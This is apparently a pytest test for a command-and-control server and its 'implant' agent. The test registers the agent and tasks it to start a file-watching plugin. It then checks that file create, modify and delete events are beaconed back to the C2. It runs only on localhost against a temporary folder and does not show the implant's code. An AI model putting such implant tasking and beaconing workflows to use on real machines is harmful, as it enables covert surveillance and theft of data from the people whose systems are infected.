import pytest
import threading
import time
import uvicorn
import requests
import os
import json
import shutil
from fastapi import FastAPI
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from crawler.c2.main import app as main_app
from crawler.c2.api import get_db
from crawler.c2 import models as c2_models
from crawler.implant.agent_core import CrawlerAgent
from crawler.c2.database import Base

# --- Test Configuration ---
HOST = "127.0.0.1"
PORT = 8888
C2_URL = f"http://{HOST}:{PORT}/api"
TEST_DIR = "test_watch_dir"

# --- Test App and DB Setup ---
test_app = FastAPI()
test_app.include_router(main_app.router)

TEST_DB_URL = "sqlite:///./test_file_watcher.db"
test_engine = create_engine(TEST_DB_URL, connect_args={"check_same_thread": False})
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)

def override_get_db():
    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()

test_app.dependency_overrides[get_db] = override_get_db

# --- Uvicorn Server Fixture ---
@pytest.fixture(scope="module")
def c2_server_and_db():
    db_file = TEST_DB_URL.replace("sqlite:///", "")
    if os.path.exists(db_file): os.remove(db_file)
    Base.metadata.create_all(bind=test_engine)

    config = uvicorn.Config(test_app, host=HOST, port=PORT, log_level="info")

    class UvicornTestServer(uvicorn.Server):
        def install_signal_handlers(self): pass
        def run_in_thread(self):
            self._thread = threading.Thread(target=self.run)
            self._thread.daemon = True
            self._thread.start()
            while not self.started: time.sleep(1e-3)
        def stop(self):
            self.should_exit = True
            if self._thread and self._thread.is_alive(): self._thread.join()

    server = UvicornTestServer(config=config)
    server.run_in_thread()
    yield
    server.stop()
    if os.path.exists(db_file): os.remove(db_file)

# --- The Test ---
def test_file_watcher_plugin(c2_server_and_db):
    if os.path.exists(TEST_DIR): shutil.rmtree(TEST_DIR)
    os.makedirs(TEST_DIR)

    # 1. Start agent
    agent = CrawlerAgent(c2_url=C2_URL)
    agent.BEACON_INTERVAL_SECONDS = 2
    agent_thread = threading.Thread(target=agent.run, name="AgentThread")
    agent_thread.daemon = True
    agent_thread.start()
    time.sleep(3)

    # 2. Verify registration and set tier
    response = requests.get(f"{C2_URL}/admin/implants")
    implant_id = response.json()[0]['id']
    requests.put(f"{C2_URL}/admin/tier/{implant_id}/1")
    print(f"\nTest: Agent registered with ID: {implant_id}")

    # 3. Start the file_watcher plugin
    task_payload = {
        "command": "start_plugin",
        "args": {"plugin_name": "file_watcher", "directory": TEST_DIR, "extensions": [".txt"]}
    }
    requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=task_payload)
    time.sleep(2) # Give watcher time to start

    # 4. Perform file operations
    test_file = os.path.join(TEST_DIR, "test.txt")
    print("\n--- Performing file operations ---")
    with open(test_file, "w") as f: f.write("hello")
    time.sleep(1)
    with open(test_file, "a") as f: f.write(" world")
    time.sleep(1)
    os.remove(test_file)

    # 5. Wait for agent to send data
    time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)

    # 6. Verify data was logged
    response = requests.get(f"{C2_URL}/admin/data/{implant_id}")
    assert response.status_code == 200
    logs = response.json()

    assert len(logs) > 0, "No data logs received from implant."

    events = [json.loads(log['data_json']) for log in logs]
    flat_events = [item for sublist in events for item in sublist] # flatten the list of lists

    event_types = [e['event_type'] for e in flat_events]
    assert "created" in event_types
    assert "modified" in event_types
    assert "deleted" in event_types
    print("Test: Verified that created, modified, and deleted events were logged.")

    # 7. Cleanup
    requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json={"command": "stop_plugin", "args": {"plugin_name": "file_watcher"}})
    requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json={"command": "terminate"})
    agent_thread.join(timeout=5)
    shutil.rmtree(TEST_DIR)
    print("Test: Finished.")
